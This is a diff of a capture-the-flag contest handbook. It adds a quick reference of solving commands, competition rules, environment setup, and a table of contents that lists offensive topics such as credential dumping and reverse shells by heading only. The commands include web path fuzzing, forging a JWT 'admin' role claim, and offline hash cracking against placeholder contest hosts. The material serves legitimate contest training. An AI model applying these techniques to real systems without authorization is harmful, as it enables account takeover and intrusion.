@@ -1,23 +1,130 @@
 # Cyber SEA Game 2026 · Human CTF Handbook
 
-Prepared for Windows/WSL and Kali from the supplied repository and tool workbook.
+Prepared for Windows/WSL and Kali from the supplied repository, tool workbook and environment PDF. Start with the quick reference; competition setup holds the access and rules details.
 
+- [Contest quick reference](#quickstart)
+- [Competition setup and rules](#competition)
+- [Choose a tool by the job](#tool-chooser)
 - [Start here: the human solver's field guide](#00-start-here)
 - [Tools and competition rules](#00-tool-rules)
 - [First ten minutes: get evidence before guessing](#01-first-ten-minutes)
-- [Web exploitation: follow the request to the trust boundary](#02-web-exploitation)
 - [Disk, memory, and host forensics](#03-forensics)
+- [Malware analysis and configuration recovery](#09-malware)
+- [Web exploitation: follow the request to the trust boundary](#02-web-exploitation)
+- [Reverse engineering: turn a program into a checkable explanation](#06-reverse-engineering)
+- [OSINT from supplied evidence](#10-osint)
+- [Cryptography: recover the structure before the secret](#07-cryptography)
+- [Miscellaneous: turn unfamiliar artifacts into a small model](#11-miscellaneous)
 - [Network captures and hardware signals](#04-network)
 - [Steganography, documents, and media](#05-steganography)
-- [Reverse engineering: turn a program into a checkable explanation](#06-reverse-engineering)
-- [Cryptography: recover the structure before the secret](#07-cryptography)
 - [Binary exploitation: prove the primitive, then build the chain](#08-binary-exploitation)
-- [Malware analysis and configuration recovery](#09-malware)
-- [OSINT from supplied evidence](#10-osint)
-- [Miscellaneous: turn unfamiliar artifacts into a small model](#11-miscellaneous)
-- [Excluded workflows and advanced material](#12-excluded-and-advanced)
 - [Pwn practice atlas: 43 cases, each with a specific lesson](#13-pwn-practice-atlas)
 - [Advanced cryptography: choose a model you can verify](#14-advanced-crypto)
+- [Vernon's CPTS notes](#cpts)
+- [External Resources](#cpts-external-resources-8d4c7c1a)
+- [Things to run on base Kali](#cpts-things-to-run-on-base-kali-16524e15)
+- [Advanced Domain Enumeration](#cpts-enumeration-ad-enumeration-advanced-domain-enumeration-ea04e6f6)
+- [Basic Enumeration](#cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e)
+- [Methodology](#cpts-enumeration-ad-enumeration-methodology-4ece01a2)
+- [Password Policy Discovery](#cpts-enumeration-ad-enumeration-password-policy-discovery-75263604)
+- [User Enumeration](#cpts-enumeration-ad-enumeration-user-enumeration-247f74c0)
+- [netcat](#cpts-enumeration-basic-enumeration-netcat-3782f2cb)
+- [nmap](#cpts-enumeration-basic-enumeration-nmap-71f192fc)
+- [whatweb](#cpts-enumeration-basic-enumeration-whatweb-968b4bb4)
+- [wpscan](#cpts-enumeration-basic-enumeration-wpscan-f89cb6da)
+- [111,2049 nfs](#cpts-enumeration-service-enumeration-111-2049-nfs-e3cbe8f1)
+- [135 WMI](#cpts-enumeration-service-enumeration-135-wmi-e1af59a1)
+- [139,445 smb](#cpts-enumeration-service-enumeration-139-445-smb-fb8e6af0)
+- [143,993 imap-pop3](#cpts-enumeration-service-enumeration-143-993-imap-pop3-52cb67bb)
+- [1433 mssql](#cpts-enumeration-service-enumeration-1433-mssql-0715e518)
+- [1521 oracle-tns](#cpts-enumeration-service-enumeration-1521-oracle-tns-40e2c3f8)
+- [161,162 snmp](#cpts-enumeration-service-enumeration-161-162-snmp-122c9bd9)
+- [21 ftp](#cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6)
+- [22 ssh](#cpts-enumeration-service-enumeration-22-ssh-cb7e3280)
+- [25,587 smtp](#cpts-enumeration-service-enumeration-25-587-smtp-a77466e5)
+- [3306 mysql](#cpts-enumeration-service-enumeration-3306-mysql-3d7e83f5)
+- [3389 rdp](#cpts-enumeration-service-enumeration-3389-rdp-2169bdb7)
+- [512-514 r-services](#cpts-enumeration-service-enumeration-512-514-r-services-39d8144a)
+- [53 dns](#cpts-enumeration-service-enumeration-53-dns-982aa88f)
+- [5985,5986 WinRM](#cpts-enumeration-service-enumeration-5985-5986-winrm-4ff73d47)
+- [623 IPMI](#cpts-enumeration-service-enumeration-623-ipmi-fd1b107c)
+- [80,443 http](#cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8)
+- [873 rsync](#cpts-enumeration-service-enumeration-873-rsync-1ea34b15)
+- [Public Exploits](#cpts-enumeration-service-enumeration-public-exploits-06f789b1)
+- [Bind Shell](#cpts-exploits-bind-shell-47d00c53)
+- [Password Cracking](#cpts-exploits-password-cracking-c9c27216)
+- [Password Spraying (Brute forcing)](#cpts-exploits-password-spraying-brute-forcing-002cc339)
+- [Reverse Shell](#cpts-exploits-reverse-shell-a7dfcd09)
+- [AS-REP Roasting](#cpts-exploits-ad-exploits-as-rep-roasting-fe53b24b)
+- [DCSync Attack](#cpts-exploits-ad-exploits-dcsync-attack-6c94bd8d)
+- [Kerberoasting](#cpts-exploits-ad-exploits-kerberoasting-8eb4e711)
+- [LLMNR-NBTNS Poisoning](#cpts-exploits-ad-exploits-llmnr-nbtns-poisoning-d7c6a994)
+- [Silver Ticket Attack](#cpts-exploits-ad-exploits-silver-ticket-attack-996b78a5)
+- [DNS](#cpts-exploits-service-exploits-dns-1358e590)
+- [FTP](#cpts-exploits-service-exploits-ftp-73147af4)
+- [RDP](#cpts-exploits-service-exploits-rdp-76d94045)
+- [SMB](#cpts-exploits-service-exploits-smb-0ab037f4)
+- [SMTP-IMAP-POP3](#cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e)
+- [SQL](#cpts-exploits-service-exploits-sql-fcb4d003)
+- [Convert ccache or kirbi file to and fro](#cpts-misc-convert-ccache-or-kirbi-file-to-and-fro-9b4c4171)
+- [Double Pivot](#cpts-misc-double-pivot-ac26bf28)
+- [Gaining Shell Access](#cpts-misc-gaining-shell-access-b83293f9)
+- [MS Office Macro](#cpts-misc-ms-office-macro-8ec8c7ff)
+- [Pivot with Ligolo](#cpts-misc-pivot-with-ligolo-111fca60)
+- [Runas another user](#cpts-misc-runas-another-user-4be36188)
+- [Search for flag on compromised system](#cpts-misc-search-for-flag-on-compromised-system-225a86d6)
+- [Transferring Files (Linux)](#cpts-misc-transferring-files-linux-5d70baa3)
+- [Transferring Files (Windows)](#cpts-misc-transferring-files-windows-089b5bd9)
+- [Transferring Files](#cpts-misc-transferring-files-9a1f8b61)
+- [make new admin user in windows](#cpts-misc-make-new-admin-user-in-windows-e17c21fa)
+- [non-tty shell to tty shell](#cpts-misc-non-tty-shell-to-tty-shell-7f6f46ec)
+- [Port Forwarding](#cpts-post-exploits-port-forwarding-d33c6cbd)
+- [Cracking Login Credentials](#cpts-post-exploits-linux-cracking-login-credentials-3cabf121)
+- [Credential Hunting](#cpts-post-exploits-linux-credential-hunting-a70f40cf)
+- [Pass the Ticket (PtT)](#cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa)
+- [DCOM](#cpts-post-exploits-windows-dcom-f7ad3a18)
+- [Dumping out CredMan](#cpts-post-exploits-windows-dumping-out-credman-2c400c4d)
+- [Dumping out LSASS](#cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd)
+- [Dumping out NTDS.dit](#cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253)
+- [Dumping out SAM](#cpts-post-exploits-windows-dumping-out-sam-8475da60)
+- [Invoke-RunasCs](#cpts-post-exploits-windows-invoke-runascs-82bcc924)
+- [NTLMv2 Relay](#cpts-post-exploits-windows-ntlmv2-relay-1a9fa4cb)
+- [Overpass the Hash](#cpts-post-exploits-windows-overpass-the-hash-9f40f285)
+- [Pass the Hash](#cpts-post-exploits-windows-pass-the-hash-b577bda5)
+- [Pass the Ticket (PtT)](#cpts-post-exploits-windows-pass-the-ticket-ptt-22d39f78)
+- [Psexec](#cpts-post-exploits-windows-psexec-54de10de)
+- [Searching for traces](#cpts-post-exploits-windows-searching-for-traces-30841cff)
+- [WMI & WinRM](#cpts-post-exploits-windows-wmi-winrm-6f7840cf)
+- [$PATH](#cpts-privesc-path-83561099)
+- [SSH Keys](#cpts-privesc-ssh-keys-9d5895fc)
+- [Scripts](#cpts-privesc-scripts-c4d7f139)
+- [Service Binary Hijacking-MacBook Pro](#cpts-privesc-service-binary-hijacking-macbook-pro-4551c4c6)
+- [User Privileges](#cpts-privesc-user-privileges-db86feff)
+- [Vulnerable Software](#cpts-privesc-vulnerable-software-0b603bf7)
+- [Crontabs (Scheduled Tasks)](#cpts-privesc-linux-crontabs-scheduled-tasks-ae8a4f87)
+- [Exposed Confidential Info](#cpts-privesc-linux-exposed-confidential-info-9d2298c6)
+- [Methodology Checklist](#cpts-privesc-linux-methodology-checklist-c0fa3016)
+- [OS and Kernel Exploits](#cpts-privesc-linux-os-and-kernel-exploits-0610e3eb)
+- [Path Abuse](#cpts-privesc-linux-path-abuse-b5a507cc)
+- [SUID Sticky Bit](#cpts-privesc-linux-suid-sticky-bit-a4af3b7a)
+- [Write perms to etc passwd](#cpts-privesc-linux-write-perms-to-etc-passwd-8d41f403)
+- [Admin user with no admin privileges](#cpts-privesc-windows-admin-user-with-no-admin-privileges-19acc37f)
+- [DLL Hijacking](#cpts-privesc-windows-dll-hijacking-3a400c32)
+- [Exposed Credentials](#cpts-privesc-windows-exposed-credentials-09889ee3)
+- [Methodology Checklist](#cpts-privesc-windows-methodology-checklist-32314143)
+- [Scheduled Tasks](#cpts-privesc-windows-scheduled-tasks-2dc078d8)
+- [Service Binary Hijacking](#cpts-privesc-windows-service-binary-hijacking-ada39c1a)
+- [Services Automatically Started on Boot](#cpts-privesc-windows-services-automatically-started-on-boot-769440ef)
+- [Unquoted Service Paths](#cpts-privesc-windows-unquoted-service-paths-53b627a0)
+- [AD Reconnaissance](#cpts-reconnaissance-ad-reconnaissance-cbb23af1)
+- [Cloud Resources](#cpts-reconnaissance-cloud-resources-836ba495)
+- [Domain Discovery](#cpts-reconnaissance-domain-discovery-d1213c29)
+- [Host Discovery](#cpts-reconnaissance-host-discovery-a202aa9e)
+- [Password Hunting](#cpts-reconnaissance-password-hunting-d3163f7e)
+- [Username Discovery](#cpts-reconnaissance-username-discovery-3e712759)
+- [Web Reconnaissance](#cpts-reconnaissance-web-reconnaissance-2c284fa9)
+- [Excluded workflows and advanced material](#12-excluded-and-advanced)
+- [Recipe downloads and source](#recipes)
 - [Tool matrix: the complete supplied list](#tool-matrix)
 - [Source coverage and editorial decisions](#source-coverage)
 
@@ -25,23 +132,659 @@ Prepared for Windows/WSL and Kali from the supplied repository and tool workbook
 
 ---
 
+<a id="quickstart"></a>
+
+<a id="quickstart--contest-quick-reference"></a>
+
+# Contest quick reference
+
+**Pick one task. Run its command. Check the result.** Use the [tool chooser](#tool-chooser) when deciding between programs; open a full chapter only when you need more depth.
+
+**Run:** replace example filenames and use the named machine. Open a terminal in the extracted guide folder so `recipes/` is beside you. [Terminal and download setup](#competition--open-this-guide).
+
+**Competition:** notes and prepared scripts are allowed. Flags typically use `CSG_FLAG{...}`; submit the full value to CTFd. [Access, limits and rules](#competition).
+
+| What you have | Jump straight to |
+| --- | --- |
+| URL, cookie or request | [Web paths](#quickstart--web-paths), [JWT role](#quickstart--jwt-role) |
+| Password hashes or encrypted archive | [Hash cracking](#quickstart--hash-cracking), [tool choice](#tool-chooser--passwords-and-hashes) |
+| PNG, tar or Windows events | [PNG trailer](#quickstart--png-trailer), [duplicate tar files](#quickstart--duplicate-tar-files), [process event](#quickstart--process-event) |
+| Packet capture | [Network conversation](#quickstart--network-conversation) |
+| RSA numbers or Base64 text | [RSA](#quickstart--rsa), [decode layers](#quickstart--decode-layers) |
+| Binary or byte checker | [Static reversing](#quickstart--static-reversing), [XOR and rotation](#quickstart--xor-and-rotation), [small VM](#quickstart--small-vm) |
+| Crash bytes | [Crash offset](#quickstart--crash-offset) |
+| Suspicious script, image clue, restricted interpreter | [Malware](#quickstart--malware), [OSINT](#quickstart--osint), [miscellaneous](#quickstart--miscellaneous) |
+
+<a id="quickstart--web-paths"></a>
+
+## Web paths
+
+**Use when:** you have a challenge URL and want hidden routes. **Kali.** Use a short list based on observed links/source; replace these example names. Discovery words are different from password guesses.
+
+```bash
+curl -i 'http://challenge.example/a-name-that-should-not-exist'
+printf '%s\n' profile export status > words.txt
+ffuf -u 'http://challenge.example/FUZZ' -w words.txt -ac -t 1 -rate 1 -timeout 10 -maxtime 30
+```
+
+**Look for:** a response that differs from the fake-path baseline. Open a candidate with `curl -i 'http://challenge.example/candidate'`. A 200 alone can be a custom error page. If results disappear, inspect the baseline and retry without `-ac`; automatic filtering can hide valid pages. [More web recipes](#02-web-exploitation).
+
+<a id="quickstart--jwt-role"></a>
+
+## JWT role
+
+**Use when:** evidence suggests a JWT signature is not checked. Changing a payload does not forge its signature. **WSL Python** edits the token; **Kali curl** or **WSL Burp Repeater** sends it.
+
+Save only the captured token in `token.txt`. The default edit is the JSON claim `"role":"admin"`:
+
+```bash
+python3 recipes/jwt_claim.py token.txt
+```
+
+**Kali:** keep the two token files on Kali for these requests; replace `/flag` with the observed endpoint. Do not assume WSL files are on the remote machine.
+
+```bash
+curl -i -H "Authorization: Bearer $(cat token.txt)" 'http://challenge.example/flag'
+curl -i -H "Authorization: Bearer $(cat edited-token.txt)" 'http://challenge.example/flag'
+```
+
+**WSL GUI alternative:** Burp → captured request → Send to Repeater → replace its Bearer token with `edited-token.txt` → Send. If the app uses a cookie, edit that cookie instead.
+
+**Success:** the server grants the requested access and returns the real answer. **Rejected:** signature verification may be working; inspect the actual auth flow instead of repeatedly changing role names. [JWT detail](#02-web-exploitation--5-jwt-and-jwe-inspect-before-changing).
+
+<a id="quickstart--hash-cracking"></a>
+
+## Hash cracking
+
+**Use when:** you have an offline hash and know its algorithm. **Kali.** This example is **raw MD5 only**, not every 32-character string.
+
+```bash
+john --format=raw-md5 --wordlist=words.txt hashes.txt
+john --show --format=raw-md5 hashes.txt
+```
+
+**Success:** `--show` prints the recovered password. Verify it against the challenge. **No hashes loaded:** check file syntax and the format; do not assume the wordlist is the problem. **No password found:** the list may miss it. Use [the comparison table](#tool-chooser--passwords-and-hashes) for hashcat, archive extractors and online login guessing.
+
+<a id="quickstart--png-trailer"></a>
+
+## PNG trailer
+
+**Use when:** a PNG may have a second file appended. **WSL Python.**
+
+```bash
+python3 recipes/png_tail.py carrier.png
+```
+
+**Look for:** nonzero trailing bytes and a recognizable header/text. The script previews text and reports CRCs. If unclear, inspect with `xxd -l 128 png-trailer.bin` or `strings -a png-trailer.bin`. Zero bytes means try metadata or pixel channels; a bad CRC means inspect structure before trusting it. This does not test pixel steganography. [Other image tools](#tool-chooser--steganography-and-audio).
+
+<a id="quickstart--duplicate-tar-files"></a>
+
+## Duplicate tar files
+
+**Use when:** a tar archive contains repeated filenames or a previous version matters. **WSL Python.**
+
+```bash
+python3 recipes/tar_keep.py evidence.tar --out tar-parts
+```
+
+**Look for:** two printed entries with the same original name but different numbered output files. `tar-parts/manifest.jsonl` maps names to saved files; previews show the first 120 bytes. Inspect a chosen member:
+
+```bash
+strings -a tar-parts/000000.bin
+```
+
+**If it stops:** read the error. Existing output directory? Choose a new `--out` name. Extraction budget exceeded? Earlier members are retained; list the archive before extracting more. [Disk and archive workflows](#03-forensics).
+
+<a id="quickstart--process-event"></a>
+
+## Process event
+
+**Use when:** asked what program ran and when. **Windows PowerShell, JSON input:**
+
+```powershell
+Get-Content -Raw events.json | ConvertFrom-Json | Format-List
+```
+
+**EVTX input instead:**
+
+```powershell
+Get-WinEvent -FilterHashtable @{Path='.\Security.evtx'; Id=4688} | ForEach-Object {
+  [xml]$eventXml = $_.ToXml()
+  $fields = @{}
+  $eventXml.Event.EventData.Data | ForEach-Object { $fields[$_.Name] = $_.'#text' }
+  [pscustomobject]@{
+    UTC = $eventXml.Event.System.TimeCreated.SystemTime
+    Program = $fields['NewProcessName']
+    Command = $fields['CommandLine']
+  }
+} | Format-List
+```
+
+| Field in the supplied record | Read it as |
+| --- | --- |
+| Security provider, event 4688 | A process started; not a file-creation event |
+| `SystemTime` (often exported as `TimeCreated`) ending in `Z` | UTC timestamp; preserve it before converting time zones |
+| `NewProcessName` | Executable path |
+| `CommandLine` (some exports rename it `ProcessCommandLine`) | Arguments, if command-line auditing captured them |
+
+For JSON in **WSL**, use `jq . events.json`. An export without a timezone needs its settings checked. A blank command line does not prove no arguments. This event alone does not prove malicious intent, successful completion or payload effects. [Microsoft's event definition](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4688).
+
+<a id="quickstart--network-conversation"></a>
+
+## Network conversation
+
+**Windows Wireshark:** File → Open capture → Statistics → Conversations → TCP. Right-click the relevant conversation → Apply as Filter → Selected → A ↔ B. Close the dialog, then right-click a displayed packet → Follow → TCP Stream. Search the stream for the clue; change the display to Raw before saving binary data.
+
+**Windows PowerShell with TShark installed at the workbook's Windows location:**
+
+```powershell
+& 'C:\Program Files\Wireshark\tshark.exe' -r .\capture.pcapng -q -z conv,tcp
+& 'C:\Program Files\Wireshark\tshark.exe' -r .\capture.pcapng -Y 'http.request' -T fields -e tcp.stream -e http.host -e http.request.uri
+```
+
+**Look for:** host/path and stream number associated with the clue. No HTTP output can mean TLS, another protocol, or the wrong capture; it does not mean no traffic. [Recover an HTTP download](#04-network--http-credentials-and-files) · [Network tools](#tool-chooser--network).
+
+<a id="quickstart--rsa"></a>
+
+## RSA
+
+**Use when:** raw RSA supplies `n`, `e`, `c`, and you know the prime factors or suspect they are close. **WSL Python.** Save these values in `rsa.json`; decimal numbers or quoted `0x...` strings are accepted. Add `p` and `q` if known.
+
+```json
+{"n": 3233, "e": 17, "c": 2790, "p": 61, "q": 53}
+```
+
+```bash
+python3 recipes/rsa.py rsa.json
+```
+
+**Success:** `re-encryption: OK`, candidate bytes and `rsa-plain.bin`; this tiny example yields `b'A'`. Without `p,q`, the script tries at most 100,000 Fermat steps. **No close factors:** switch to another RSA attack, not a longer blind wait. Padding remains; leading zero bytes need a known `length`. Factors must be distinct primes. [Other RSA routes](#07-cryptography).
+
+<a id="quickstart--decode-layers"></a>
+
+## Decode layers
+
+**Use when:** text looks like Base64, possibly wrapping zlib/gzip. **WSL Python.**
+
+```bash
+python3 recipes/layers.py message.txt --out decoded
+```
+
+**Look for:** `layer1.bin` plus `layer2.bin` when a compression header is recognized, with a preview printed. The original is preserved. Any bytes after the compressed stream go to `trailing.bin`. **Strict Base64 error:** if the line is `payload=VALUE`, save only VALUE in a new text file, keeping final `=` padding; rerun with that filename. Otherwise check for hex or URL-safe Base64. **Existing directory:** choose a fresh output name. [Other encodings](#11-miscellaneous).
+
+<a id="quickstart--static-reversing"></a>
+
+## Static reversing
+
+**Kali radare2:** `r2 -A challenge.bin`, then type these inside r2:
+
+```text
+iz
+afl
+s main
+pdf
+q
+```
+
+**Look for:** strings, input-reading calls and the comparison deciding success. `main` may be missing in stripped files; select a function address from `afl`, then `pdf @ 0xADDRESS`. **Windows/WSL alternative:** Ghidra → New Project → Import File → open in CodeBrowser → Analyze → Search → for Strings → references to the success/failure string. This is static inspection; no target execution is required. [Reverse tool choices](#tool-chooser--reverse-engineering).
+
+<a id="quickstart--xor-and-rotation"></a>
+
+## XOR and rotation
+
+**Use only for:** `stored[i] = ROL8(input[i] XOR repeated_key[i], rotation)`. Undo rotation, then XOR. **WSL Python.** Put the recovered constants in `checker.json`:
+
+```json
+{"key_hex":"6b6579", "rotation":3, "expected":[81,57,209]}
+```
+
+```bash
+python3 recipes/transform.py checker.json
+```
+
+**Success:** `forward check: OK` and recovered bytes (`b'ABC'` in this example). The script verifies every byte against the stored table. **Different transform/order:** change the model first; this is not a universal decryptor. [Inversion rules](#06-reverse-engineering--8-write-down-the-transform-before-solving-it).
+
+<a id="quickstart--small-vm"></a>
+
+## Small VM
+
+**Use when:** you have already recovered a straight-line VM operating on one input byte. **WSL Python.** Save decoded instructions in `vm.json`:
+
+```json
+{"program":[["LOAD_INPUT"],["XOR",35],["ADD",7],["CMP",111],["HALT"]]}
+```
+
+```bash
+python3 recipes/vm_byte.py vm.json
+```
+
+**Success:** decimal `75`, hex `0x4b`, byte `b'K'`; every comparison matches. The helper checks all 256 bytes with fresh state. Supported operations: LOAD_INPUT, XOR, ADD, ROL, CMP, HALT; arithmetic wraps at 8 bits. **No match or unsupported opcode:** correct the decoded semantics; branches, memory and multiple inputs need a different model. [Full VM workflow](#06-reverse-engineering--10-custom-vms-and-emulation).
+
+<a id="quickstart--crash-offset"></a>
+
+## Crash offset
+
+**Use when:** you generated input with this exact pattern helper and recovered four crash bytes in memory order. **WSL Python.**
+
+```bash
+python3 recipes/pattern.py --length 512
+python3 recipes/pattern.py --find 61616763 --sent pattern.bin
+```
+
+The first command writes `pattern.bin`; supply that file through the vulnerable program's actual input path. The second example returns **173** and verifies the bytes lie inside that file. Your crash bytes will differ. **`-1` or not verified:** wrong byte order, wrong generator, or bytes outside the sent input. An offset alone is not an exploit. [Pwn tools](#tool-chooser--binary-exploitation).
+
+<a id="quickstart--malware"></a>
+
+## Malware
+
+**Start with static inspection. WSL:**
+
+```bash
+strings -a suspect.bin
+xxd -l 64 suspect.bin
+```
+
+**Look for:** format, URLs, imports or encoded text. Strings are clues, not proof of execution. For Base64 scripts use [decode layers](#quickstart--decode-layers); for macros use [oletools](#tool-chooser--malware). If strings are empty, check packing and encoding before considering an isolated runtime. [Detailed malware workflows](#09-malware).
+
+<a id="quickstart--osint"></a>
+
+## OSINT
+
+**Start with the supplied file. WSL:**
+
+```bash
+exiftool -a -G1 -s clue.jpg
+```
+
+**Look for:** GPS, timestamp offsets and device/software tags. Check a second clue such as signs, shadows or visible landmarks; metadata can be edited. No GPS is a reason to examine the picture, not to upload it. [OSINT tools](#tool-chooser--osint).
+
+<a id="quickstart--miscellaneous"></a>
+
+## Miscellaneous
+
+**Encoded text?** [Decode layers](#quickstart--decode-layers). **Audio?** [Audio tools](#tool-chooser--steganography-and-audio). **JSON? WSL:** `jq . challenge.json`.
+
+For a restricted interpreter, first write down the allowed characters, available objects, input limit and intended output. Read supplied source before trying payloads: a Python jail, Bash restriction and arithmetic puzzle need different approaches. [Choose a matching miscellaneous recipe](#11-miscellaneous).
+
+<a id="quickstart--before-the-event"></a>
+
+## Before the event
+
+Read [Competition setup](#competition) once. During solving, use one matching card; open a full chapter only when it helps.
+
+
+---
+
+<a id="competition"></a>
+
+<a id="competition--competition-setup-and-rules"></a>
+
+# Competition setup and rules
+
+Based on the supplied **Practice Environment Setup Guide**, read alongside the tool workbook. Page references below link to the [unchanged PDF included with this guide](sources/practice-environment.pdf). Pages 1–11 describe the competition; page 12 explicitly starts the **19–23 October practice-session** instructions. Do not assume practice launch quotas or credentials are competition-day rules.
+
+<a id="competition--open-this-guide"></a>
+
+## Open this guide
+
+Extract the ZIP and open `index.html` in Chrome, or read `QUICKSTART.md`. Keep the `recipes/` and `sources/` folders beside it. For Python helpers, open PowerShell in the extracted folder and run `wsl`; its terminal inherits that working directory. Run the shown `python3 recipes/...` command there. Use the supplied remote Kali session for Kali-labelled commands; laptop files are not automatically present there.
+
+Website-only copy: open [Recipe downloads](#recipes), save a needed script into a `recipes` subfolder, and open a terminal in its parent folder. Helpers use the standard library. Check `python3 --version` on the machine you chose. The ZIP also carries the source PDF; `index.html` alone embeds the guide text and helpers, not that PDF.
+
+<a id="competition--what-is-allowed"></a>
+
+## What is allowed
+
+| Need | Competition rule | Source |
+| --- | --- | --- |
+| Bring this guide or prepared scripts | Physical/electronic notes, cheat sheets, books, digital references, personal Notion/GitHub references and scripts created before the competition are allowed | [p.7](sources/practice-environment.pdf#page=7) |
+| Look up a technique | Google Search, technical/vendor/programming documentation, CVE databases, HackTricks, PayloadsAllTheThings, Microsoft docs, Linux manuals and Google Translate are allowed | [p.6](sources/practice-environment.pdf#page=6) |
+| Add a missing library/dependency/plugin/package | Allowed when not related to generative AI; availability and compatibility still need checking | [p.5](sources/practice-environment.pdf#page=5) |
+| Add an unlisted standalone application | Organizer approval is required; packaging an application with pip does not turn it into an unrestricted library | [p.5](sources/practice-environment.pdf#page=5) |
+| Use personal commercial software | Personal commercial licenses, such as IDA, cannot be used to bypass the common environment | [pp.5,21](sources/practice-environment.pdf#page=21) |
+| Use AI | Generative-AI assistants, code/script generation and challenge analysis are prohibited during competition. Automatically displayed search-result AI summaries may be viewed | [p.8](sources/practice-environment.pdf#page=8) |
+| Use online analysis services | Do not upload challenge files to online services. Use local decoders, hash crackers and decompilers | [pp.6,21](sources/practice-environment.pdf#page=21) |
+| Collaborate | Work freely within your team. No external help, external sharing of challenge content or unofficial communication outside the team. Notes may be kept afterward | [p.9](sources/practice-environment.pdf#page=9) |
+| Use a phone at the table | Phones must be deposited; no external communication devices at competition tables | [p.10](sources/practice-environment.pdf#page=10) |
+
+**Read the two sources together:** the workbook still identifies installed environments and named exclusions. Its AI/ML-library prohibition is broader than the PDF's generative-AI wording; this guide keeps AI/ML tools excluded. The PDF does not expressly clear individual entries on the workbook's Unapproved List. Use the listed alternatives; if you specifically need one of those entries, resolve that conflict through the official organizer channel. This is a conservative reconciliation, not a claim that every installation failure has the same reason as a rule prohibition. [Package setup commands](#00-tool-rules--non-ai-python-package-checks).
+
+<a id="competition--choose-the-machine-before-the-tool"></a>
+
+## Choose the machine before the tool
+
+| Environment | Supplied resources | Good starting jobs |
+| --- | --- | --- |
+| Windows 11 Pro laptop | Core Ultra 5 235H (2.40 GHz); 32 GB RAM; 1 TB SSD; 64-bit; 1920×1200 display | Native Wireshark, Autopsy, HxD, x64dbg and dnSpyEx; keep large evidence on the laptop |
+| WSL on that laptop | Installed tools are identified by the workbook; it shares the laptop's resources and may have a lower configured memory limit | Python helpers, Ghidra, GDB, Volatility 3, Sleuth Kit and the listed Linux utilities |
+| Remote Kali through Platform Experience | **t3.large: 2 vCPU, 8 GiB RAM, 40 GB disk**, GUI; SSH/RDP requires VPN | Kali-only tools, small targeted scans and local CPU-bound jobs; avoid several heavy jobs at once |
+
+Hardware facts: [PDF pp.3–4](sources/practice-environment.pdf#page=3). AWS lists no accelerator for t3.large, so **do not plan on GPU hashcat cracking on this Kali instance**. Start with short clue-derived wordlists and a supported John format; `hashcat -I` checks its available compute backend. [AWS instance specifications](https://docs.aws.amazon.com/ec2/latest/instancetypes/gp.html).
+
+**Kali, before extracting large files or running a heavy job:**
+
+```bash
+df -h .
+free -h
+nproc
+```
+
+Check free disk against the **expanded** archive size, not just its download size. Stream large files rather than reading them entirely into Python memory. Keep Windows-only parsers on Windows; move large work to an appropriate laptop tool when possible, not to an unapproved application.
+
+The organizer put Defender-sensitive tools such as Hayabusa/Sigma rules, Metasploit and mimikatz on Kali. Use their supplied Kali location; **do not disable Defender or add laptop exclusions as the workaround**. [PDF pp.4,22](sources/practice-environment.pdf#page=22).
+
+<a id="competition--access-approved-network-vpn-then-kali"></a>
+
+## Access: approved network, VPN, then Kali
+
+**At the event:** use the organizer's approved hotel network and day-of access details. CTFd and related infrastructure are IP-restricted. The PDF identifies VPN as necessary for SSH/RDP to Kali. A failed portal connection from another network does not establish that the portal is down. [PDF pp.3–4](sources/practice-environment.pdf#page=3).
+
+1. Open the supplied Platform Experience environment and wait for **Provisioning succeeded**.
+2. Read the current **Kali IP**, **Kali username/password**, and **OpenVPN IP** from the cloud/status panel. The VPN endpoint and Kali address are different values.
+3. In the installed Windows OpenVPN client, import/connect using the profile and instructions supplied by Platform Experience. Do not invent the VPN profile or ports.
+4. Connect to **your Kali IP** by the provided SSH or RDP route. Use the supplied credentials, not a guessed `kali/kali` default.
+
+The detailed panel sequence is from the **practice** section, [p.18](sources/practice-environment.pdf#page=18); follow the competition's current panel/instructions if they differ. No real portal login, VPN connection or VM launch was performed while preparing this guide.
+
+**Windows PowerShell**, after replacing the placeholder with your assigned Kali IP:
+
+```powershell
+$kaliIp = 'YOUR_ASSIGNED_KALI_IP'
+Test-NetConnection -ComputerName $kaliIp -Port 3389
+mstsc /v:$kaliIp
+```
+
+This checks the usual RDP port, then opens Remote Desktop; use a different port only if Platform Experience specifies one. `TcpTestSucceeded : True` establishes reachability, not successful authentication. [Microsoft connection check](https://learn.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection) and [RDP client syntax](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc).
+
+**SSH alternative**, only if the provided Windows client is present:
+
+```powershell
+Get-Command ssh,scp -ErrorAction SilentlyContinue
+ssh YOUR_KALI_USER@YOUR_ASSIGNED_KALI_IP
+```
+
+For file transfer using that client:
+
+```powershell
+scp .\challenge.zip YOUR_KALI_USER@YOUR_ASSIGNED_KALI_IP:~/
+scp YOUR_KALI_USER@YOUR_ASSIGNED_KALI_IP:~/answer.txt .\answer.txt
+```
+
+If the client is absent, use the supplied RDP route and organizer-supported transfer method; do not install an unlisted standalone client on assumption. WSL paths such as `/mnt/c/Users/...` reach the **local laptop**, not remote Kali. Do not publish challenge files or answers through a personal GitHub repository to transfer them. Prepared references and external sharing of live challenge content are different uses.
+
+| Symptom | First useful check |
+| --- | --- |
+| CTFd does not open | Approved hotel network and exact current URL; then official support |
+| Portal works but Kali does not | VPN connected, correct Kali IP (not OpenVPN IP), provisioning complete |
+| RDP works but a WSL tool is missing | Those tools are on the laptop; enter WSL there or choose the Kali alternative |
+| Script cannot find a file | Check the current machine and working directory before editing the script |
+| A heavy job stalls | Check free RAM/disk, stop duplicate jobs, and narrow the candidate set |
+
+<a id="competition--categories-flags-and-time"></a>
+
+## Categories, flags and time
+
+This is a Jeopardy-style CTF with separate daily challenge sets and flag submission through CTFd. The PDF lists **seven categories**: Digital Forensics, Malware Analysis, Web Security, Reverse Engineering, OSINT, Cryptography and Miscellaneous. This guide's navigation follows that list. Network and steganography remain supporting techniques; pwn and historical practice remain supplementary. The earlier public-page grouping was different; this revision uses the supplied operational guide. [PDF p.2](sources/practice-environment.pdf#page=2).
+
